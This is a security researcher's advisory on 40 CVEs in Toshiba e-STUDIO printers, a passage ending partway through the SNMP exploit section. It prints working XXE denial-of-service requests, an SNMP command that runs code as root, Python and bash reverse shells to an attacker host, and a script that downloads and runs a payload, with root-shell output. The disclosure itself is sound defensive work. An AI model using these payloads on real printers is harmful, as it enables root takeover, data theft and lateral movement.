<!DOCTYPE html>
<html>
<head>
<title>40 vulnerabilities in Toshiba Multi-Function Printers - IT Security Research by Pierre</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="css/bootstrap.min.css" rel="stylesheet">
<link href="feed.xml" rel="alternate" type="application/rss+xml" title="Blog" />
<style>
body {
    font-family: sans-serif;
    background-color: #fff;
    font-size: 16px;
}
h1, h2, h3, h4 {
    font-family: arial;
}
.container {
    max-width: 900px;
}
.footer {
    margin-top: 50px;
    font-size: 12px;
    text-align: center;
}
</style>
</head>
<body>
<div class="container">
    <div class="hero-unit faq">
        <div class="ac" style="text-align: center;">
            <h1>IT Security Research by Pierre</h1>
            <a href="../index.html">Home</a> &bull; <a href="about.html">About</a>  &bull; <a href="feed.xml">Feed</a>
        </div>
    </div>
    
<div class="hero-unit faq">
    <div class="ac">
        <h2>40 vulnerabilities in Toshiba Multi-Function Printers</h2>
    </div>
</div>

<div>
    <h2>Product description</h2>
<blockquote>
<p>e-STUDIO Multi-Function Printers (MFPs) are fast and productive, providing businesses and organisations the capability to produce what you need, when you need it.</p>
<p>From <a href="https://www.toshibatec.co.uk/workplace-solutions/products-and-solutions/mfps-and-printers/">https://www.toshibatec.co.uk/workplace-solutions/products-and-solutions/mfps-and-printers/</a></p>
</blockquote>
<h2>Vulnerability Summary</h2>
<p>Vulnerable versions: 103 different models of Toshiba Multi-Function Printers (MFP) are vulnerable. It is recommended to visit the official <a href="https://www.toshibatec.com/information/20240531_01.html">Toshiba advisory</a>, review the <a href="https://www.toshibatec.com/information/pdf/information20240531_01.pdf">list of affected printers</a> and apply security patches and replace unsupported MFP models.</p>
<p>The summary of the vulnerabilities is as follows:</p>
<ol>
<li><a href="#pre-auth-xxe-dos">CVE-2024-27141 - Pre-authenticated Blind XML External Entity (XXE) injection - DoS</a></li>
<li><a href="#pre-auth-xxe">CVE-2024-27142 - Pre-authenticated XXE injection</a></li>
<li><a href="#pre-auth-rce-snmp">CVE-2024-27143 - Pre-authenticated Remote Code Execution as root</a></li>
<li><a href="#pre-auth-rces-upload">CVE-2024-27144 - Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a><br>
4.1. <a href="#pre-auth-rce-upload-wsgi-py">Remote Code Execution - Upload of a new .py module inside WSGI Python programs</a><br>
4.2. <a href="#pre-auth-rce-upload-wsgi-ini">Remote Code Execution - Upload of a new .ini configuration files inside WSGI Python programs</a><br>
4.3. <a href="#pre-auth-rce-upload-gdb">Remote Code Execution - Upload of a malicious script <code>/tmp/backtraceScript.sh</code> and injection of malicious gdb commands</a><br>
4.4. <a href="#pre-auth-rce-upload-sapphost">Remote Code Execution - Upload of a malicious <code>/home/SYSROM_SRC/build/common/bin/sapphost.py</code> program</a><br>
4.5. <a href="#pre-auth-rce-libs">Remote Code Execution - Upload of malicious libraries</a><br>
4.6. <a href="#pre-auth-rce-misc">Other ways to get Remote Code Execution</a></li>
<li><a href="#post-auth-rces-upload">CVE-2024-27145 - Multiple Post-authenticated Remote Code Executions as root</a></li>
<li><a href="#lack-privilages-separation">CVE-2024-27146 - Lack of privileges separation</a></li>
<li><a href="#lpe-rce-snmpd">CVE-2024-27147 - Local Privilege Escalation and Remote Code Execution using snmpd</a></li>
<li><a href="#lpe-rce-path">CVE-2024-27148 - Local Privilege Escalation and Remote Code Execution using insecure PATH</a></li>
<li><a href="#lpe-rce-ld-preload">CVE-2024-27149 - Local Privilege Escalation and Remote Code Execution using insecure LD_PRELOAD</a></li>
<li><a href="#lpe-rce-ld-library-path">CVE-2024-27150 - Local Privilege Escalation and Remote Code Execution using insecure LD_LIBRARY_PATH</a></li>
<li><a href="#lpe-rce-106-programs">CVE-2024-27151 - Local Privilege Escalation and Remote Code Execution using insecure permissions for 106 programs</a><br>
11.1. <a href="#lpe-rce-3-programs">3 vulnerable programs not running as root</a><br>
11.2. <a href="#lpe-rce-103-programs">103 vulnerable programs running as root</a></li>
<li><a href="#lpe-rce-libs">CVE-2024-27152 - Local Privilege Escalation and Remote Code Execution using insecure permissions for libraries</a><br>
12.1. <a href="#lpe-rce-syscallerr">Example with <code>/home/SYSROM_SRC/bin/syscallerr</code></a></li>
<li><a href="#lpe-rce-cissm">CVE-2024-27153 - Local Privilege Escalation and Remote Code Execution using CISSM</a></li>
<li><a href="#passwords-logs">CVE-2024-27154 and CVE-2024-27155 - Passwords stored in clear-text logs and insecure logs</a><br>
14.1. <a href="#passwords-logs-01">Clear-text password written in logs when an user logs into the printer</a><br>
14.2. <a href="#passwords-logs-02">Clear-text password written in logs when a password is modified</a></li>
<li><a href="#sessions-logs-01">CVE-2024-27156 - Leak of authentication sessions in insecure logs in /ramdisk/work/log directory</a></li>
<li><a href="#sessions-logs-02">CVE-2024-27157 - Leak of authentication sessions in insecure logs in /ramdisk/al/network/log directory</a></li>
<li><a href="#hardcoded-root-password">CVE-2024-27158 - Hardcoded root password</a></li>
<li><a href="#harcoded-password-logs">CVE-2024-27159 - Hardcoded password used to encrypt logs</a></li>
<li><a href="#harcoded-password-logs-weak-cipher">CVE-2024-27160 - Hardcoded password used to encrypt logs and use of a weak digest cipher</a></li>
<li><a href="#harcoded-password-files">CVE-2024-27161 - Hardcoded password used to encrypt files</a></li>
<li><a href="#dom-xss">CVE-2024-27162 - DOM-based XSS present in the /js/TopAccessUtil.js file</a></li>
<li><a href="#leak-admin-password">CVE-2024-27163 - Leak of admin password and passwords</a></li>
<li><a href="#hardcoded-password-telnetd">CVE-2024-27164 - Hardcoded credentials in telnetd</a></li>
<li><a href="#lpe-procsuid">CVE-2024-27165 - Local Privilege Escalation using PROCSUID</a></li>
<li><a href="#insecure-core-files">CVE-2024-27166 - Insecure permissions for core files</a></li>
<li><a href="#lpe-sendmail">CVE-2024-27167 - Insecure permissions used for Sendmail - Local Privilege Escalation</a></li>
<li><a href="#hardcoded-keys-python">CVE-2024-27168 - Hardcoded keys found in Python applications used to generate authentication cookies</a></li>
<li><a href="#lpe-webpanel">CVE-2024-27169 - Lack of authentication in WebPanel - Local Privilege Escalation</a></li>
<li><a href="#hardcoded-credentials-webdav">CVE-2024-27170 - Hardcoded credentials for WebDAV access</a></li>
<li><a href="#insecure-permissions">CVE-2024-27171 - Insecure permissions</a></li>
<li><a href="#rce-command-injection">CVE-2024-27172 - Remote Code Execution - command injection as root</a></li>
<li><a href="#rce-insecure-upload-01">CVE-2024-27173 - Remote Code Execution - insecure upload</a></li>
<li><a href="#rce-insecure-upload-02">CVE-2024-27174 - Remote Code Execution - insecure upload</a></li>
<li><a href="#lfi">CVE-2024-27175 - Local File Inclusion</a></li>
<li><a href="#rce-insecure-upload-03">CVE-2024-27176 - Remote Code Execution - insecure upload</a></li>
<li><a href="#rce-insecure-upload-04">CVE-2024-27177 - Remote Code Execution - insecure upload</a></li>
<li><a href="#rce-insecure-copy">CVE-2024-27178 - Remote Code Execution - insecure copy</a></li>
<li><a href="#session-disclosure-logs">CVE-2024-27179 - Session disclosure inside the log files in the installation of applications</a></li>
<li><a href="#toctou-rce">CVE-2024-27180 - TOCTOU vulnerability in the installation of applications, allowing to install rogue applications and get RCE</a></li>
</ol>
<p>CVE-2024-27171 to CVE-2024-27180 affect the implementation of third-party application system and third-party applications installed by default in Toshiba printers - this is an extremely interesting attack surface for persistence.</p>
<p>TL;DR: An attacker can compromise Toshiba Multi-Function Printers using multiple vulnerabilities.</p>
<p>List of vulnerable models of Toshiba Multi-Function Printers (103 models):</p>
<pre><code>2021AC, 2521AC, 2020AC, 2520AC, 2025NC, 2525AC, 3025AC, 3525AC, 3525ACG, 4525AC, 4525ACG, 5525AC, 5525ACG,
6525AC, 6525ACG, 2528A, 3028A, 3528A, 3528AG, 4528A, 4528AG, 5528A, 6528A, 6526AC, 6527AC, 7527AC, 6529A,
7529A, 9029A, 330AC, 400AC, 2010AC, 2110AC, 2510AC, 2610AC, 2015NC, 2515AC, 2615AC, 3015AC, 3115AC, 3515AC,
3615AC, 4515AC, 4615AC, 5015AC, 5115AC, 2018A, 2518A, 2618A, 3018A, 3118A, 3018AG, 3518A, 3518AG, 3618A,
3618AG, 4518A, 4518AG, 4618A, 4618AG, 5018A, 5118A, 5516AC, 5616AC, 6516AC, 6616AC, 7516AC, 7616AC, 5518A,
5618A, 6518A, 6618A, 7518A, 7618A, 8518A, 8618A, 2000AC, 2500AC, 2005NC, 2505AC, 3005AC, 3505AC, 4505AC,
5005AC, 2008A, 2508A, 3008A, 3008AG, 3508A, 3508AG, 4508A, 4508AG, 5008A, 5506AC, 6506AC, 7506AC, 5508A,
6508A, 7508A, 8508A, 3508LP, 4508LP, 5008LP.
</code></pre>
<p><em>Miscellaneous notes</em>:</p>
<p>This security assessment was entirely done using a blackbox approach and fully-remote - I only had some IPs of printers (no physical access and no credentials for admin or normal users). Consequently, the physical security of the printers was not analyzed and the vulnerabilities were confirmed with different models running the latest firmware versions (e-STUDIO2010AC, e-STUDIO3005AC, e-STUDIO3508A and e-STUDIO5018A).</p>
<p>The vulnerabilities were communicated to Toshiba on June 14, 2023 and communications with Toshiba were very effective.</p>
<p><em>Impacts</em></p>
<p>An attacker can compromise Toshiba multi-function printers (MFP) and execute code. These printers are running Linux and are powerful. They are ideal to host implants (and fun programs, like Bettercap) and move laterally inside infrastructures.</p>
<p><em>Recommendations</em></p>
<ul>
<li>Use network segmentation to isolate MFPs.</li>
<li>Apply security patches.</li>
<li>Replace unsupported MFPs.</li>
</ul>
<p><a id="pre-auth-xxe-dos"></a></p>
<h2>Details - Pre-authenticated Blind XML External Entity (XXE) injection - DoS</h2>
<p>The Toshiba printers use XML communication for the <code>/contentwebserver</code> API endpoint provided by the printer.</p>
<p>This endpoint is managed by an Apache module located inside the <code>mod_contentwebserver.so</code> library. This library provides XML parsing and is vulnerable to a time-based blind XML External Entity (XXE) vulnerability.</p>
<p>Using a Billion-laugh attack, we can confirm there is a time-based blind XXE vulnerability. When sending only 1 entity (&amp;lol1) that is defined inside the lolz root element, this &amp;lol1 entity is expanding into 10 entities and the request takes 200ms. </p>
<p>With an entity that is expanding into:</p>
<ul>
<li>10^10 entities, the request takes 206ms;</li>
<li>10^10^10 entities, the request takes 541ms;</li>
<li>10^10^10^10 entities, the request takes 2.7s;</li>
<li>10^10^10^10^2 entities, the request takes 8.8s;</li>
<li>10^10^10^10^2 entities, the request takes 30.9s;</li>
</ul>
<p>Even if the Apache server displays <code>MODULE_ERROR:SendRequest failed</code>, the XML has been successfully evaluated by the <code>mod_contentwebserver.so</code> library running in the remote printer.</p>
<p>The payload is:</p>
<pre><code>POST /contentwebserver HTTP/1.1
Host: 10.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */* 
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Pragma: no-cache
Content-Type: text/plain; charset=utf-8
csrfpId: 10.0.0.2.852d519a6fa9825fae857bac5c003da0
Content-Length: 759 
Origin: http://10.0.0.1:8080
Connection: close
Referer: http://10.0.0.1:8080/?MAIN=TOPACCESS
Cookie: Session=10.0.0.2.852d519a6fa9825fae857bac5c003da0; Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DLOGS; IgnoreSessionTimeout=1

&lt;!DOCTYPE lolz [
 &lt;!ENTITY lol "lol"&gt;
 &lt;!ELEMENT lolz (#PCDATA)&gt;
 &lt;!ENTITY lol1 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
 &lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"&gt;
 &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
 &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;
 &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;"&gt;
 &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;
 &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;
 &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;
 &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;
]&gt;
&lt;lolz&gt;&amp;lol5;&lt;/lolz&gt;
</code></pre>
<p>Using this HTTP request inside Burp (with a correct session while browsing the printer without authentication), we can modify the entity on the last line; we can see that the XML has been parsed by comparing the time required for the printer to analyze the request.</p>
<p>The time will appear inside Burp on the bottom-right of the Window (in red in the following screenshots):</p>
<p><img alt="" src="images/2024-toshiba-xxe-dos.png" /></p>
<p><a href="images/2024-toshiba-xxe-dos-full.png">Click here for full image</a></p>
<p>With 10^10^10^10^4 entity, then request takes 30 seconds.</p>
<p>HTTP requests containing more XML complexity (with a lot of XML entities to be parsed) will DoS the printer and the CPU of the printer will run at 100%.</p>
<p>The XML parser is vulnerable to XXE, without authentication.</p>
<p>Exfiltration of file over HTTP, FTP and gopher was not obtained as some protections seem to be implemented in the XML parser.</p>
<p><a id="pre-auth-xxe"></a></p>
<h2>Details - Pre-authenticated XXE injection</h2>
<p>The Toshiba printers use XML communication for the <code>/contentwebserver</code> API endpoint provided by the printer.</p>
<p>This endpoint is managed by an Apache module located inside the <code>mod_contentwebserver.so</code> library. This library provides XML parsing and is vulnerable to a XML External Entity (XXE) vulnerability.</p>
<p>Using a Billion-laugh attack and correctly formatted data for the printer (with the Toshiba-specific non-public DTD, the tags will be interpreted by the remote printer), we can confirm the presence of a XXE vulnerability. The resulting evaluated XML will be displayed by the printer:</p>
<p><img alt="" src="images/2024-toshiba-xxe.png" /></p>
<p><a href="images/2024-toshiba-xxe-full.png">Click here for full image</a></p>
<p>The malicious payload is (containing a <code>&lt;X&gt;&amp;lol4;&lt;/X&gt;</code>):</p>
<pre><code>POST /contentwebserver HTTP/1.1
Host: 10.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Pragma: no-cache
Content-Type: text/plain; charset=utf-8
csrfpId: 10.0.0.2.5d5255447c6eb69fc84a2d8c2056eb7d
Content-Length: 1226
Origin: http://10.0.0.1:8080
Connection: close
Referer: http://10.0.0.1:8080/Administration/CreateNewPwd.html
Cookie: Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DDEVICE; IgnoreSessionTimeout=1; clicked=0; addrLastVisited=ADDRBK; Session=10.0.0.2.5d5255447c6eb69fc84a2d8c2056eb7d; PREF=%7BList%2C8%2CClip
boardForPage-%7D; PROGSTAT=0

&lt;!DOCTYPE lolz [
 &lt;!ENTITY lol "lol"&gt;
 &lt;!ELEMENT lolz (#PCDATA)&gt;
 &lt;!ENTITY lol1 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
 &lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"&gt;
 &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
 &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;
 &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;"&gt;
 &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;
 &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;
 &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;
 &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;
]&gt;
&lt;?xml version="1.0"?&gt;
&lt;DeviceInformationModel&gt;
  &lt;GetValue&gt;
    &lt;UserManager&gt;
      &lt;View&gt;
        &lt;Users/&gt;
      &lt;/View&gt;
    &lt;/UserManager&gt;
  &lt;/GetValue&gt;
  &lt;SetValue&gt;
    &lt;UserManager&gt;
      &lt;View&gt;
        &lt;Users&gt;
          &lt;User&gt;
            &lt;Information&gt;
              &lt;X&gt;&amp;lol4;&lt;/X&gt;
            &lt;/Information&gt;
          &lt;/User&gt;
        &lt;/Users&gt;
      &lt;/View&gt;
    &lt;/UserManager&gt;
  &lt;/SetValue&gt;
  &lt;Command&gt;
    &lt;ForgotPassword&gt;
      &lt;commandNode&gt;UserManager/Users&lt;/commandNode&gt;
      &lt;Params&gt;
        &lt;userDetails contentType="XPath"&gt;UserManager/View/Users/User&lt;/userDetails&gt;
        &lt;cmdDetails commandType="Reset"/&gt;
      &lt;/Params&gt;
    &lt;/ForgotPassword&gt;
  &lt;/Command&gt;
&lt;/DeviceInformationModel&gt;
</code></pre>
<p>And the response will be:</p>
<pre><code>HTTP/1.1 200 OK
Date: Wed, 27 May 2023 10:54:12 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=63072000
Accept-Language: en-US,en;q=0.5
Connection: close
Content-Type: text/xml
Content-Length: 30465

&lt;?xml version="1.0"?&gt;
&lt;DeviceInformationModel&gt;
  &lt;GetValue&gt;
    &lt;UserManager&gt;
      &lt;View&gt;
        &lt;Users&gt;
          &lt;User&gt;
            &lt;Information&gt;
              &lt;X&gt;lollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollol[...]lollollollollol&lt;/X&gt;
            &lt;/Information&gt;
          &lt;/User&gt;
        &lt;/Users&gt;
      &lt;/View&gt;
    &lt;/UserManager&gt;
  &lt;/GetValue&gt;
  &lt;Command&gt;
    &lt;ForgotPassword&gt;
      &lt;commandNode&gt;UserManager/Users&lt;/commandNode&gt;
      &lt;Params&gt;
        &lt;userDetails contentType="XPath"&gt;UserManager/View/Users/User&lt;/userDetails&gt;
        &lt;cmdDetails commandType="Reset"/&gt;
      &lt;/Params&gt;
      &lt;Response&gt;
        &lt;statusOfOperation&gt;STATUS_FAILED&lt;/statusOfOperation&gt;
      &lt;/Response&gt;
    &lt;/ForgotPassword&gt;
  &lt;/Command&gt;
&lt;/DeviceInformationModel&gt;
kali%
</code></pre>
<p>The XML parser is vulnerable to XXE, without authentication.</p>
<p>An attacker can exploit the XXE to retrieve information.</p>
<p>Exploitability was not analyzed in depth since a RCE was found at the same time: <a href="#pre-auth-rce-snmp">Pre-authenticated Remote Code Execution as root</a>.</p>
<p><a id="pre-auth-rce-snmp"></a></p>
<h2>Details - Pre-authenticated Remote Code Execution as root</h2>
<p>It was observed that the Toshiba printers use SNMP for configuration.</p>
<p>By default, these communities are used:</p>
<ul>
<li><code>public</code> for read only access;</li>
<li><code>private</code> for read/write access.</li>
</ul>
<p>Using the <code>private</code> community, it is possible to remotely execute commands as root on the remote printer.</p>
<p>For example, these commands will execute the command <code>id</code> as root on the remote printer:</p>
<pre><code>kali% snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private [ip] 'nsExtendStatus."cmd"' = createAndGo 'nsExtendCommand."cmd"' = /bin/sh 'nsExtendArgs."cmd"' = '-c id'
NET-SNMP-EXTEND-MIB::nsExtendStatus."cmd" = INTEGER: createAndGo(4)
NET-SNMP-EXTEND-MIB::nsExtendCommand."cmd" = STRING: /bin/sh
NET-SNMP-EXTEND-MIB::nsExtendArgs."cmd" = STRING: -c id

kali% snmpbulkwalk -c private -v2c [ip] NET-SNMP-EXTEND-MIB::nsExtendObjects
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 6
NET-SNMP-EXTEND-MIB::nsExtendCommand."cmd" = STRING: /bin/sh
NET-SNMP-EXTEND-MIB::nsExtendArgs."cmd" = STRING: -c id
NET-SNMP-EXTEND-MIB::nsExtendInput."cmd" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."cmd" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."cmd" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."cmd" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."cmd" = INTEGER: volatile(2)
NET-SNMP-EXTEND-MIB::nsExtendStatus."cmd" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."cmd" = STRING: uid=0(root) gid=2000(trusted) groups=0(root)
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."cmd" = STRING: uid=0(root) gid=2000(trusted) groups=0(root)
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."cmd" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendResult."cmd" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendOutLine."cmd".1 = STRING: uid=0(root) gid=2000(trusted) groups=0(root)
</code></pre>
<p>Using this vulnerability will allow any attacker to get a root access on a remote Toshiba printer as shown below.</p>
<p>This following PoC will execute a connect-back shell with root privilege to 10.0.0.2:21/tcp:</p>
<pre><code>kali% snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private [ip] 'nsExtendStatus."cmd"' = createAndGo 'nsExtendCommand."cmd"' = /home/SYSROM_SRC/build/release/bin/python 'nsExtendArgs."cmd"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.0.0.2\",21));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
NET-SNMP-EXTEND-MIB::nsExtendStatus."cmd" = INTEGER: createAndGo(4)
NET-SNMP-EXTEND-MIB::nsExtendCommand."cmd" = STRING: /home/SYSROM_SRC/build/release/bin/python
NET-SNMP-EXTEND-MIB::nsExtendArgs."cmd" = STRING: -c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.0.0.2\",21));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"
kali% snmpbulkwalk -c private -v2c [ip] NET-SNMP-EXTEND-MIB::nsExtendObjects
</code></pre>
<p>And on the attacker machine, we will receive a shell on port 21/tcp:</p>
<pre><code>kali# nc -l -v -p 21
listening on [any] 21 ...
10.0.0.1: inverse host lookup failed: Unknown host 
connect to [10.0.0.2] from (UNKNOWN) [10.0.0.1] 43467
sh-4.1# uname -ap
Linux MFP12188257 3.10.38-ltsi-WR6.0.0.11_standard #3010 SMP Wed Jul 6 16:20:23 IST 2022 i686 GNU/Linux
sh-4.1# id
uid=0(root) gid=2000(trusted) groups=0(root)
sh-4.1# exit
</code></pre>
<p>The attacker will then get a full root access in the printer, including full access to the encrypted partition:</p>
<pre><code>kali# nc -l -v -p 443
listening on [any] 443 ...
10.0.0.1: inverse host lookup failed: Unknown host
connect to [10.0.0.2] from (UNKNOWN) [10.0.0.1] 36468
bash-4.1# df -h
df -h
Filesystem            Size  Used Avail Use% Mounted on
rootfs                4.8G  3.7G  904M  81% /
/dev/root              48M   28M   18M  62% /old_root
/dev/sda2             4.8G  3.7G  904M  81% /
/dev/sda13            4.8G   49M  4.5G   2% /platform
none                  1.5G  188K  1.5G   1% /dev
/dev/sda3             4.8G  1.3G  3.4G  28% /rollback
/dev/sda5              25G  904M   23G   4% /work
/dev/sda6             2.9G  620M  2.2G  23% /registration
/dev/sda7             976M  1.3M  908M   1% /backup
/dev/sda8              32G   60M   30G   1% /imagedata
/dev/sda9              94G   65M   89G   1% /application
/dev/mapper/enc_encryption
                      992M  2.6M  964M   1% /encryption
/dev/sda12            119G   60M  112G   1% /storage
tmpfs                 1.5G  3.7M  1.5G   1% /dev/shm
bash-4.1# mount
mount
rootfs on / type rootfs (rw)
/dev/root on /old_root type ext2 (rw,relatime,errors=continue,user_xattr)
proc on /old_root/proc type proc (rw,relatime)
/dev/sda2 on / type ext4 (rw,relatime,nodelalloc,nobarrier,data=ordered)
/dev/sda13 on /platform type ext4 (rw,relatime,nodelalloc,nobarrier,data=ordered)
proc on /proc type proc (rw,relatime)
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
none on /dev type tmpfs (rw,relatime,mode=755)
ramfs on /ramdisk type ramfs (rw,relatime,size=100m)
/dev/sda3 on /rollback type ext4 (rw,relatime,nodelalloc,nobarrier,data=ordered)
/dev/sda5 on /work type ext4 (rw,relatime,nodelalloc,nobarrier,data=ordered)
/dev/sda6 on /registration type ext4 (rw,relatime,nodelalloc,nobarrier,data=ordered)
/dev/sda7 on /backup type ext4 (rw,relatime,nodelalloc,nobarrier,data=ordered)
/dev/sda8 on /imagedata type ext4 (rw,relatime,nodelalloc,nobarrier,data=ordered)
/dev/sda9 on /application type ext4 (rw,relatime,nodelalloc,nobarrier,data=ordered)
/dev/mapper/enc_encryption on /encryption type ext4 (rw,relatime,nodelalloc,nobarrier,data=ordered)
/dev/sda12 on /storage type ext4 (rw,relatime,nodelalloc,nobarrier,data=ordered)
tmpfs on /dev/shm type tmpfs (rw,relatime,mode=755)
devpts on /dev/pts type devpts (rw,relatime,mode=600)
fusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)
bash-4.1#
</code></pre>
<p>The vulnerability is located inside net-snmpd, as net-snmpd supports the <code>NET-SNMP-EXTEND-MIB</code> extension MIB.</p>
<p>This extension allows the execution of code from the net-snmpd daemon, with root privileges, with 2 steps:</p>
<ol>
<li>Definition of a new MIB;</li>
<li>Execution of the new MIB.</li>
</ol>
<p>A bash payload is also provided:</p>
<p>This following PoC will download a shell script, save it inside <code>/dev/shm/pwn.sh</code> and execute it as root on the targeted printer:</p>
<pre><code>kali% cat /var/www/html/pwn.sh 
#!/bin/sh

bash -i &gt;&amp; /dev/tcp/10.0.0.2/443 0&gt;&amp;1

kali% cat ./remote-pwn.sh
#!/bin/sh

snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private $1 'nsExtendStatus."cmd"' = createAndGo 'nsExtendCommand."cmd"' = /bin/sh 'nsExtendArgs."cmd"' = '-c "curl http://10.0.0.2/pwn.sh -o /dev/shm/pwn.sh"'
snmpbulkwalk -c private -v2c $1 NET-SNMP-EXTEND-MIB::nsExtendObjects
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private $1 'nsExtendStatus."cmd"' = createAndGo 'nsExtendCommand."cmd"' = /bin/sh 'nsExtendArgs."cmd"' = '-c "chmod 755 /dev/shm/pwn.sh"'
snmpbulkwalk -c private -v2c $1 NET-SNMP-EXTEND-MIB::nsExtendObjects
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private $1 'nsExtendStatus."cmd"' = createAndGo 'nsExtendCommand."cmd"' = /bin/sh 'nsExtendArgs."cmd"' = ' "/dev/shm/pwn.sh"'
snmpbulkwalk -c private -v2c $1 NET-SNMP-EXTEND-MIB::nsExtendObjects
</code></pre>
<p>Using this PoC to get a connect-back root shell:</p>
<pre><code>kali% ./remote-pwn.sh 10.0.0.1
NET-SNMP-EXTEND-MIB::nsExtendStatus."cmd" = INTEGER: createAndGo(4)
NET-SNMP-EXTEND-MIB::nsExtendCommand."cmd" = STRING: /bin/sh
NET-SNMP-EXTEND-MIB::nsExtendArgs."cmd" = STRING: -c "curl http://10.0.0.2/pwn.sh -o /dev/shm/pwn.sh"
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 21
NET-SNMP-EXTEND-MIB::nsExtendCommand."cmd" = STRING: /bin/sh
NET-SNMP-EXTEND-MIB::nsExtendArgs."cmd" = STRING: -c "curl http://10.0.0.2/pwn.sh -o /dev/shm/pwn.sh"
NET-SNMP-EXTEND-MIB::nsExtendInput."cmd" = STRING:
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."cmd" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."cmd" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."cmd" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."cmd" = INTEGER: volatile(2)
NET-SNMP-EXTEND-MIB::nsExtendStatus."cmd" = INTEGER: active(1)
